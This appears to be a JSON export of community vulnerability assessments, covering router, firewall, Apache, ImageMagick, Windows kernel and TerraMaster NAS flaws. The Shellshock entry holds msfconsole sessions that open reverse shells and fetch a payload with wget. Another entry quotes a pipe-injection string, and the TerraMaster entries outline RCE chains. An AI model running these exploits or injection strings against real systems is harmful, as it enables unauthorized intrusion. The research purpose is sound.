          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "fe612d40-4060-4684-979b-1d4a42f41940",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "8bab95c1-f1e9-4c76-afd2-31e44239cc5a",
      "created": "2023-05-19T13:05:02.938447Z",
      "revisionDate": "2023-05-19T13:05:02.937087Z",
      "document": "The vulnerability was detected in version 1.1.2 of the MiniDLNA service within the firmware version 2.1.6 Build 20220128 rel.15823(4555) of the TP-Link AX1800 WiFi 6 Router Archer AX20(EU). The exploit requirs either physical access or LAN access to the router. It could potentially enable an attacker to execute arbitrary code on the device, thereby granting unauthorized access and control over the router.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "a330270d-41dc-44a2-af75-b6e446bb36fd",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "dc0924c2-2ff3-4148-af0e-48a6e58b0b39",
      "created": "2023-05-19T18:44:02.012704Z",
      "revisionDate": "2023-05-19T18:44:02.010017Z",
      "document": "Per @sfewer-r7's [Rapid7 analysis](https://attackerkb.com/topics/N3i8dxpFKS/cve-2023-28771/rapid7-analysis): \r\n\r\n> CVE-2023-28771 was introduced into the firmware from version 4.60, which was released on October 21, 2020, more than two and a half years ago. The vulnerable component is the Internet Key Exchange (IKE) packet decoder, which forms part of the IPSec VPN service offered by the device. Note: A VPN does not need to be configured on the device for the device to be vulnerable \u2014 an affected device is vulnerable in a default state. An attacker can send a specially crafted UDP packet to port 500 in the WAN interface and achieve unauthenticated command execution as the root user.\r\n\r\n40K+ exposed web interfaces, which probably undersells exposure. Attackers tend to like these devices, and the vuln's been hiding in the firmware for years now.  Likely to be exploited at scale, possibly exploited under the radar already. ",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "ee3ca521-eef2-4a50-a88e-0581133c7502",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "5200081c-5c1d-47c7-88a9-89c269e0482e",
      "created": "2023-05-21T15:28:19.015151Z",
      "revisionDate": "2023-05-22T13:20:30.542901Z",
      "document": "An `Golden Oldie` from 2014 that is still very relevant nowadays.\r\n\r\nIn my recent research of security vulnerabilities, I bumped into  several targets that were still vulnerable to [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271) a.k.a. `Shellshock` and [CVE-2014-6278](https://nvd.nist.gov/vuln/detail/CVE-2014-6278). You should not be surprised that most of these targets  are IoT based  with an embedded Linux/Unix image running a vulnerable `bash` version. They typically do not get updated at all and are easy targets for a malicious actor to find an entry point into the network.\r\n\r\nMetasploit modules like  `exploit/multi/http/apache_mod_cgi_bash_env_exec`, are pretty restricted to launch an attack due to the limited platform support (only x86) and payloads that can be leveraged in an attack.  This brought me to rewrite this module a bit so that it would support multiple platforms (ARM, x86, x64, MIPS) and multiple payloads such as `Unix command` and `Linux Dropper`. The module name is `multi/http/bash_env_cgi_rce`.\r\n\r\nTo test the module locally, you download a vulnerable `bash` version from https://ftp.gnu.org/gnu/bash/bash-4.3.tar.gz. Any version published before September 2014 is okay. Just extract it in a local directory and compile it with `./configure && make`.\r\n\r\nConfigure an `Apache` or any other preferred web server to support `CGI` scripts. You can find tons of instructions on the web how to do that.\r\nJust create a script like below using the vulnerable `bash` version and add this to the `cgi-bin` directory of your preferred web server.\r\n```\r\n#!/bin/bash_CVE_2014_6271\r\necho \"Content-type: text/plain\"\r\necho\r\necho\r\necho \"Hello World\"\r\n```\r\nDownload module from [here](https://github.com/h00die-gr3y/Metasploit/blob/main/bash_env_cgi_rce.rb) and follow the [install instructions](https://github.com/h00die-gr3y/Metasploit/blob/main/README.md).\r\nStart `msfconsole` and play around with the different options and payloads.\r\n```\r\nmsf6 > use exploits/multi/http/bash_env_cgi_rce\r\n[*] Using configured payload cmd/unix/reverse_bash\r\nmsf6 exploit(multi/http/bash_env_cgi_rce) > options\r\n\r\nModule options (exploit/multi/http/bash_env_cgi_rce):\r\n\r\n   Name         Current Setting  Required  Description\r\n   ----         ---------------  --------  -----------\r\n   CVE          Automatic        yes       CVE to check/exploit (Accepted: Automatic, CVE-2014-62\r\n                                           71, CVE-2014-6278)\r\n   HEADER       User-Agent       yes       HTTP header to use\r\n   METHOD       GET              yes       HTTP method to use\r\n   PAYLOADSIZE  2048             yes       Payload size used by the CmdStager\r\n   Proxies                       no        A proxy chain of format type:host:port[,type:host:port\r\n                                           ][...]\r\n   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/do\r\n                                           cs/using-metasploit/basics/using-metasploit.html\r\n   RPORT        80               yes       The target port (TCP)\r\n   SSL          false            no        Negotiate SSL/TLS for outgoing connections\r\n   SSLCert                       no        Path to a custom SSL certificate (default is randomly\r\n                                           generated)\r\n   TARGETURI                     yes       Path to CGI script\r\n   URIPATH                       no        The URI to use for this exploit (default is random)\r\n   VHOST                         no        HTTP server virtual host\r\n\r\n\r\n   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:\r\n\r\n   Name     Current Setting  Required  Description\r\n   ----     ---------------  --------  -----------\r\n   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This mus\r\n                                       t be an address on the local machine or 0.0.0.0 to listen\r\n                                       on all addresses.\r\n   SRVPORT  8080             yes       The local port to listen on.\r\n\r\n\r\nPayload options (cmd/unix/reverse_bash):\r\n\r\n   Name   Current Setting  Required  Description\r\n   ----   ---------------  --------  -----------\r\n   LHOST                   yes       The listen address (an interface may be specified)\r\n   LPORT  4444             yes       The listen port\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Unix Command\r\n\r\n\r\nView the full module info with the info, or info -d command.\r\n\r\nmsf6 exploit(multi/http/bash_env_cgi_rce) > set rhosts 192.168.201.10\r\nrhosts => 192.168.201.10\r\nmsf6 exploit(multi/http/bash_env_cgi_rce) > set targeturi /cgi-bin/test.cgi\r\ntargeturi => /cgi-bin/test.cgi\r\nmsf6 exploit(multi/http/bash_env_cgi_rce) > check\r\n\r\n[*] Target is vulnerable for CVE-2014-6271.\r\n[*] Target is vulnerable for CVE-2014-6278.\r\n[+] 192.168.201.10:80 - The target is vulnerable.\r\nmsf6 exploit(multi/http/bash_env_cgi_rce) > set lhost 192.168.201.10\r\nlhost => 192.168.201.10\r\nmsf6 exploit(multi/http/bash_env_cgi_rce) > set lport 4444\r\nlport => 4444\r\nmsf6 exploit(multi/http/bash_env_cgi_rce) > exploit\r\n\r\n[*] Started reverse TCP handler on 192.168.201.10:4444\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[*] Target is vulnerable for CVE-2014-6271.\r\n[*] Target is vulnerable for CVE-2014-6278.\r\n[+] The target is vulnerable.\r\n[*] Executing Unix Command for cmd/unix/reverse_bash using vulnerability CVE-2014-6271.\r\n[*] Command shell session 1 opened (192.168.201.10:4444 -> 192.168.201.10:35766) at 2023-05-21 15:01:17 +0000\r\n\r\nid\r\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\r\nuname -a\r\nLinux cerberus 5.15.44-Re4son-v8l+ #1 SMP PREEMPT Debian kali-pi (2022-07-03) aarch64 GNU/Linux\r\n```\r\n**Python Meterpreter payload example**\r\n```\r\nmsf6 exploit(multi/http/bash_env_cgi_rce) > set payload cmd/unix/python/meterpreter/reverse_tcp\r\npayload => cmd/unix/python/meterpreter/reverse_tcp\r\nmsf6 exploit(multi/http/bash_env_cgi_rce) > exploit\r\n\r\n[*] Started reverse TCP handler on 192.168.201.10:4444\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[*] Target is vulnerable for CVE-2014-6271.\r\n[*] Target is vulnerable for CVE-2014-6278.\r\n[+] The target is vulnerable.\r\n[*] Executing Unix Command for cmd/unix/python/meterpreter/reverse_tcp using vulnerability CVE-2014-6271.\r\n[*] Sending stage (24772 bytes) to 192.168.201.10\r\n[*] Meterpreter session 2 opened (192.168.201.10:4444 -> 192.168.201.10:35678) at 2023-05-21 15:03:48 +0000\r\n\r\nmeterpreter > sysinfo\r\nComputer     : cerberus\r\nOS           : Linux 5.15.44-Re4son-v8l+ #1 SMP PREEMPT Debian kali-pi (2022-07-03)\r\nArchitecture : aarch64\r\nMeterpreter  : python/linux\r\nmeterpreter > getuid\r\nServer username: www-data\r\nmeterpreter >\r\n```\r\n**Linux File dropper using payload:** `linux/aarch64/meterpreter_reverse_tcp`\r\n```\r\nmsf6 exploit(multi/http/bash_env_cgi_rce) > set target 1\r\ntarget => 1\r\nmsf6 exploit(multi/http/bash_env_cgi_rce) > set payload linux/aarch64/meterpreter_reverse_tcp\r\npayload => linux/aarch64/meterpreter_reverse_tcp\r\nmsf6 exploit(multi/http/bash_env_cgi_rce) > set CMDSTAGER::FLAVOR wget\r\nCMDSTAGER::FLAVOR => wget\r\nmsf6 exploit(multi/http/bash_env_cgi_rce) > exploit\r\n\r\n[*] Started reverse TCP handler on 192.168.201.10:4444\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[*] Target is vulnerable for CVE-2014-6271.\r\n[*] Target is vulnerable for CVE-2014-6278.\r\n[+] The target is vulnerable.\r\n[*] Executing Linux Dropper for linux/aarch64/meterpreter_reverse_tcp using vulnerability CVE-2014-6271.\r\n[*] Using URL: http://192.168.201.10:8080/ZzirBKe\r\n[*] Client 192.168.201.10 (Wget/1.21.3) requested /ZzirBKe\r\n[*] Sending payload to 192.168.201.10 (Wget/1.21.3)\r\n[*] Meterpreter session 3 opened (192.168.201.10:4444 -> 192.168.201.10:34346) at 2023-05-21 15:10:11 +0000\r\n[*] Command Stager progress - 100.00% done (114/114 bytes)\r\n[*] Server stopped.\r\n\r\nmeterpreter > sysinfo\r\nComputer     : 192.168.201.10\r\nOS           : Debian  (Linux 5.15.44-Re4son-v8l+)\r\nArchitecture : aarch64\r\nBuildTuple   : aarch64-linux-musl\r\nMeterpreter  : aarch64/linux\r\nmeterpreter > getuid\r\nServer username: www-data\r\nmeterpreter >\r\n```\r\nIf you use `CMDSTAGER::FLAVOR` option `bourne` or `printf`, please ensure that your payload size is 2048 or below.\r\nYou can control this with the option `PAYLOADSIZE`\r\n\r\nHave fun !!!\r\n\r\n### References\r\n[Metasploit module multi/http/bash_env_cgi_rce](https://github.com/h00die-gr3y/Metasploit/blob/main/bash_env_cgi_rce.rb)\r\n\r\n\r\n\r\n\r\n ",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "edde085a-cecb-4044-8645-28d57be08a88",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "420f81c2-a7c3-4a2b-b4ce-eac9678c1c1c",
      "created": "2023-05-24T14:52:16.702228Z",
      "revisionDate": "2023-05-24T14:52:34.978388Z",
      "document": "",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "74a98d66-f32b-4c63-9316-4209db0efbdd",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "072f503e-5dfc-40db-a917-5daeb9880e59",
      "created": "2023-05-24T16:09:55.56392Z",
      "revisionDate": "2023-05-25T08:13:37.759553Z",
      "document": "This issue requires a fairly specific configuration to work. First, Apache has to be configured in a pretty specific way - a `RewriteRule` that passes user-controlled data into a query string. This line, from our configuration file above, is exploitable, as the `$1` (user data) is after the `?` (start of the query string):\r\n\r\n```\r\nRewriteRule \"^/(.*)\" \"http://localhost:8081/?arg=$1\" [P]\r\n```\r\n\r\nWhereas even a small change will break the exploit; this does _not_ work:\r\n\r\n```\r\nRewriteRule \"^/(.*)\" \"http://localhost:8081/$1\" [P]\r\n```\r\n\r\nAdditionally, this must be a security boundary \u2014 that is, smuggling an HTTP request must bypass some sort of access control check. We put together a [Github search](https://github.com/search?q=%2FRewriteRule+%5B%5E+%5D*+%5B%5E+%5D*%5C%3F%5B%5E+%5D*%5C%24%5B%5E+%5D*+%5C%5B%5B%5E+%5D*P%5B%5E+%5D*%5C%5D%2F&type=code) that tries to find software that would be exploitable if it was running on a vulnerable version of Apache, but nothing stands out as particularly interesting.\r\n\r\nApplications and devices that come as complete images with multiple servers (such as a lot of enterprise software) would probably be better targets, but checking each one is difficult. We looked into this as an alternative way to exploit [CVE-2022-1388](https://attackerkb.com/topics/SN5WCzYO7W/cve-2022-1388/rapid7-analysis), since the core of that vulnerability involved bypassing a reverse proxy's security checks, but its configuration is not vulnerable to CVE-2023-25690.\r\n\r\nThe final place we'd expect to see vulnerabilities is in reverse proxies that are configured to enforce some kind of ACL check or filtering, and that also do URL rewriting. One would have to test the specific configuration and application(s) that are being proxied; there's no easy way to scan for this sort of issue.\r\n\r\nWhile we are not aware of any specific applications that are vulnerable to this, they may turn up as people investigate this vulnerability more.",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "a37ad1c8-91c9-47e5-93a7-4bca5230fa14",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "9da46358-d261-47a0-8020-edea6f210609",
      "created": "2023-05-31T13:03:45.125677Z",
      "revisionDate": "2023-05-31T13:03:45.124424Z",
      "document": "I saw this vulnerability and dug a bit because it is an improper fix to CVE-2016-5118, which was a big deal and I wanted to know what was missed.  To be clear, this vulnerability is not a big deal.  Where CVE-2016-5118 was vulnerable in a default configuration, this vulnerability requires a non-default, purposefully-vulnerable configuration.  The maintainers for the project went so far as to revert the community-provided fix for this vulnerability claiming the behavior was a poorly-documented feature.  From the issue on ImageMagick (https://github.com/ImageMagick/ImageMagick/issues/6339):\r\n\r\n```\r\nWhen --enable-pipes is used the user opens themselves up to a potential security risk when they don't filter the input. And you don't even need to use back ticks. It is also possible to do this magick '|cat test.txt > /tmp/leak|< logo.jpg' info: when the user of our library enables this option. And as we said before this option is not enabled by default but we should make it more clear what could happen when the user of our library enables this option.\r\n```\r\n\r\nThis is not particularly surprising; enabling pipes in an application like this increases the complexity and makes proper sanitization much more difficult.  Users should ensure that the application does not have this vulnerable option turned on. ",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "c91c21c2-2e7c-4b45-98e3-c4fd015fc951",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "82041473-1f3b-4a70-b42f-c27b20b7455e",
      "created": "2023-05-31T21:15:11.549953Z",
      "revisionDate": "2023-06-12T20:46:53.342092Z",
      "document": "Doing a patch diff between a Windows 10 1607 x86 version of win32kfull.sys prior to the patch and after the patch shows that only one function changed: `xxxEnableMenuItem`.\r\n\r\nLooking at the code diff for this with BinDiff shows that two new blocks were added. These appear to be doing some validation of data and then optionally also incrementing a different data element. \r\n\r\nAfter some time getting proper structures defined in Binary Ninja, I was able to come up with the following HLIL graph showing the code for `xxxEnableMenuItem` before the patch was issued:\r\n\r\nhttps://imgur.com/oKpFgBi\r\n\r\nAnd here is the code after the patch was issued:\r\n\r\nhttps://imgur.com/ZgTCd5z\r\n\r\nOf note is the fact that the new edition of the code is checking that `pRealMenu` exists and then if it does, its incrementing that object's `cObjLock` count by one. This extra lock appears to then be undone in a call to `pRealMenu = ThreadUnlock1()`, which was also added in.\r\n\r\nFurther analysis is available at https://www.numencyber.com/cve-2023-29336-win32k-analysis/ which explains how this bug is a UAF, which makes sense given that a check was added into update the lock count appropriately. As explained in that writeup, prior to the patch, the code purely locked the window object pointed to by `pMenu->spwndNotify` and failed to also lock the menu object nested within the window object, aka the `pRealMenu` object returned by the call to `MenuItemState`.\r\n\r\nTracing the call flow backwards we can see that `xxxEnableMenuItem()` is called by `NtUserEnableMenuItem()`. According to the writeup, the menu item passed in via the first argument to `xxxEnableMenuItem()`, aka `pMenu`, would typically be locked inside of inside of a higher level function such as `NtUserEnableMenuItem()`. However they raise the question of \"okay so you have a menu object you need to lock, but which menu item would need locking?\"\r\n\r\nSo why this question in particular? Surely we are just dealing with one menu object which means one menu itself right? Well as the writeup explains, the object returned by a function such as `MenuItemState()` may encompass not only the main menu within a window object but also its submenus, and even subsubmenus in some cases.\r\n\r\nThis is becuase `MenuItemState()` will call `MNLookupItem()` which will in turn recursively call itself until it finds the object its looking for, meaning that `pMenu` may actually point to a nested set of menu objects. This looks like a potential case where assumptions could lead to some incorrect results.\r\n\r\nIn the exploit they create 4 menus, namely MenuA, MenuB, MenuC and MenuD, with MenuB being a child of MenuA, MenuC being a child of MenuB, and so on. They set the ID of MenuD to be 0xF060, aka SC_CLOSE. As noted at https://stackoverflow.com/questions/10101742/difference-between-wm-close-and-sc-close, this is sent when the user presses the close button or otherwise uses some menu control to close the window. They remove the class ID of SC_CLOSE from MenuA. They then release MenuC by deleting all references to it within MenuB, in order to ensure proper memory deallocation.\r\n\r\nWhen `xxxRedrawTitle()` is called from within `xxxEnableMenuItem()`, a transfer will be made to a user mode callback via a call to `xxxSendMessage()`, at which point the exploit removes the reference between MenuC and MenuB, effectively releasing MenuC. At this point the reference to MenuC within `xxxEnableMenuItem()` will become invalid. Keep in  mind in the code MenuC is effectively `var_pMenu_spwndNotify`\r\nso thats where the relationship comes into play.\r\n\r\nHope that helps!",
      "score": 1,
      "metadata": {
        "attacker-value": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "5467482f-aef5-4af1-8712-c406e9977821",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "8cef2eb7-4c6a-4150-8476-e8832f06341f",
      "created": "2023-06-05T09:49:21.063329Z",
      "revisionDate": "2023-06-10T08:25:46.901366Z",
      "document": "Last two weeks, I spent some time on a TerraMaster F2-221 NAS server that I got from an old friend running TerraMaster Operating System (TOS) 4.x.\r\nResearch on the Internet shows that this server is full with vulnerabilities up to `TOS 4.2.29`. Surprisingly, no `Metasploit` modules were made to exploit these NAS servers and there are still plenty of vulnerable NAS servers connected to the Internet.\r\n\r\nSo I took the liberty to write three nice modules that exploits these NAS servers targeting different vulnerabilities. \r\nThis article is covering the first of three modules,  called `TerrorMaster 1` like we do with \"good\" movies released in the cinema.  You can find the articles on `TerrorMaster 2` [here](https://attackerkb.com/topics/8rNXrrjQNy/cve-2021-45837) and `TerrorMaster 3` [here](https://attackerkb.com/topics/h8YKVKx21t/cve-2022-24990).\r\n\r\nIn December 2020, the  **IHTeam** reported multiple vulnerabilities on TerraMaster NAS devices running TOS version `4.2.06` or lower.\r\nYou can read their analysis/advisory [here.](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/)\r\n\r\n`TerrorMaster 1` is exploiting a vulnerability described in  [CVE-2020-35665](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35665) or [CVE-2020-28188](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28188) that allows an unauthenticated attacker to create /upload a webshell  via shell metacharacters in the `Event` parameter using the vulnerable endpoint `include/makecvs.php` during the `CSV` creation process.\r\n\r\nYou can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/terramaster_unauth_rce_cve_2020_35665.rb) in my local repository or as [PR 18063](https://github.com/rapid7/metasploit-framework/pull/18063) at the Metasploit Github development.\r\n\r\n### Mitigation\r\nPlease update your `TOS version` up to the latest supported `TOS 4.2.x` version or `TOS 5.x` version to be protected against all known vulnerabilities.\r\nI strongly advice **NOT** to expose your TerraMaster NAS devices directly to the Internet, because you could end-up in a situation depicted below where your server has become a victim of ransomware.\r\n![Ransomeware](https://raw.githubusercontent.com/h00die-gr3y/Metasploit/main/attackerkb/cve-2020-35665/Screenshot_DEADBOLT.png).\r\n\r\n\r\n### References\r\n[IHTeam advisory](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/)\r\n[TerrorMaster 1 - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/terramaster_unauth_rce_cve_2020_35665.rb)\r\n[TerrorMaster 1 - Metasploit PR 18063](https://github.com/rapid7/metasploit-framework/pull/18063)\r\n[TerrorMaster 2](https://attackerkb.com/topics/8rNXrrjQNy/cve-2021-45837)\r\n[TerrorMaster 3](https://attackerkb.com/topics/h8YKVKx21t/cve-2022-24990)\r\n\r\n### Credits\r\n`IHTeam`\r\n ",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a73eb5aa-113a-4d7f-aa6d-a55a018bf997",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "619c4947-1add-4eb8-bea5-40929cc9712e",
      "created": "2023-06-06T06:58:55.710036Z",
      "revisionDate": "2023-06-10T08:23:48.816254Z",
      "document": "This the second module in the sequel of  `TerrorMaster` releases.\r\n\r\n`TerrorMaster 2` is based on the vulnerability analysis work of `n0tme` that was conducted in December 2021 during Christmas time.\r\n`N0tme` discovered a few new vulnerabilities on the TerraMaster F2-210 and F4-210 model and chained them together into an unauthenticated RCE. \r\nThe full analysis can be found here [How to summon RCEs](https://thatsn0tmy.site/posts/2021/12/how-to-summon-rces/). \r\n\r\nIn this article, I will only quickly summarize the RCE chain and introduce the Metasploit module.\r\n\r\nThe Terramaster chained exploit uses session crafting to achieve escalated privileges that allows an attacker to access vulnerable code execution flaws. TOS versions `4.2.15` and below  are affected.\r\n[CVE-2021-45839](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45839) is exploited to obtain the first administrator's hash set up on the system as well as other information such as MAC address, by performing a `POST` request to the `/module/api.php?mobile/webNasIPS` vulnerable endpoint.\r\nThis information is used to craft an unauthenticated admin session using [CVE-2021-45841](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45841) where an attacker can self-sign session cookies by knowing the target MAC address and the user password hash.\r\nGuest users (disabled by default) can be abused using a null/empty hash and allow an unauthenticated attacker to login as guest. This is used to download the `/etc/group` info to obtain the list of admin users, used to establish an unauthenticated admin session thru session crafting..\r\n\r\nFinally, [CVE-2021-45837](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45837) is exploited to execute arbitrary commands as root by sending a specifically crafted input to vulnerable endpoint `/tos/index.php?app/del`.\r\n\r\nI slightly modified the original POC where the vulnerable endpoint `/module/api.php?mobile/wapNasIPS` was used to obtain the admin hash. In some cases, it did not provide this info, whilst endpoint `/module/api.php?mobile/webNasIPS` has proven to be more reliable.\r\n\r\nAs usual, you can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/terramaster_unauth_rce_cve_2021_45837.rb) in my local repository or as [PR 18070](https://github.com/rapid7/metasploit-framework/pull/18070) at the Metasploit Github development.\r\n\r\n### Mitigation\r\nPlease update your `TOS version` up to the latest supported `TOS 4.2.x` version or `TOS 5.x` version to be protected against all known vulnerabilities and do  **NOT** to expose your TerraMaster NAS devices directly to the Internet.\r\n\r\n### References\r\n[How to summon RCEs by n0tme](https://thatsn0tmy.site/posts/2021/12/how-to-summon-rces/)\r\n[CVE-2021-45839](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45839)\r\n[CVE-2021-45841](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45841)\r\n[CVE-2021-45837](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45837)\r\n[TerrorMaster 2 - h00die-gr3y Metasploit local 